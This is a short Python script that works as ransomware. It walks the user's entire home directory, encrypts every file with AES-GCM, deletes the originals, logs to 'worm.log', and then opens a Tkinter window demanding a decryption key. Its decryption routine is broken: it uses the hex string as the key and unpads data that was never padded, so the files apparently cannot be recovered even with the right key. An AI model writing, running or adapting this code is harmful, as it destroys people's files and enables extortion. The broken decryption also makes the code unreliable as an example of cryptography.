import os
import sys
import logging
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from tkinter import Tk, Label, Entry, Button, StringVar, messagebox

# AES key for encryption and decryption (In practice, never hardcode keys)
encryption_key = get_random_bytes(16)  # Randomly generate encryption key

def initialize():
    # Set up logging
    logging.basicConfig(filename='worm.log', level=logging.INFO, format='%(asctime)s %(message)s')
    logging.info('Script initialized.')

def encrypt_files():
    for root, dirs, files in os.walk(os.path.expanduser('~')):
        for file in files:
            file_path = os.path.join(root, file)
            if not os.path.isdir(file_path):
                try:
                    with open(file_path, 'rb') as f:
                        data = f.read()

                    cipher = AES.new(encryption_key, AES.MODE_GCM)
                    nonce = cipher.nonce
                    ciphertext, tag = cipher.encrypt_and_digest(data)

                    with open(file_path + '.enc', 'wb') as f:
                        f.write(nonce)
                        f.write(tag)
                        f.write(ciphertext)

                    os.remove(file_path)
                    logging.info(f"Encrypted {file_path}")
                except Exception as e:
                    logging.error(f"Failed to encrypt {file_path}: {e}")

def decrypt_files(key):
    for root, dirs, files in os.walk(os.path.expanduser('~')):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path.endswith('.enc'):
                try:
                    with open(file_path, 'rb') as f:
                        encrypted_data = f.read()

                    nonce = encrypted_data[:16]
                    tag = encrypted_data[16:32]
                    ciphertext = encrypted_data[32:]

                    cipher = AES.new(key.encode(), AES.MODE_GCM, nonce=nonce)
                    original_data = cipher.decrypt_and_verify(ciphertext, tag)

                    with open(file_path[:-4], 'wb') as f:
                        f.write(unpad(original_data, AES.block_size))

                    os.remove(file_path)
                    logging.info(f"Decrypted {file_path}")
                except Exception as e:
                    logging.error(f"Failed to decrypt {file_path}: {e}")

def show_lock_bar(decryption_key):
    def check_key():
        user_key = key_var.get()
        if user_key == decryption_key:
            messagebox.showinfo("Success", "Correct key! Decrypting files...")
            root.destroy()
            decrypt_files(user_key)
        else:
            messagebox.showerror("Error", "Incorrect key. Try again.")

    root = Tk()
    root.title("Enter Decryption Key")
    root.geometry("300x150")

    Label(root, text="Enter Decryption Key:").pack(pady=10)
    key_var = StringVar()
    Entry(root, textvariable=key_var, show="*").pack(pady=5)
    Button(root, text="Submit", command=check_key).pack(pady=10)

    root.mainloop()

def main():
    initialize()
    encrypt_files()
    decryption_key = encryption_key.hex()  # Use the generated key for decryption
    show_lock_bar(decryption_key)

if __name__ == "__main__":
    main()
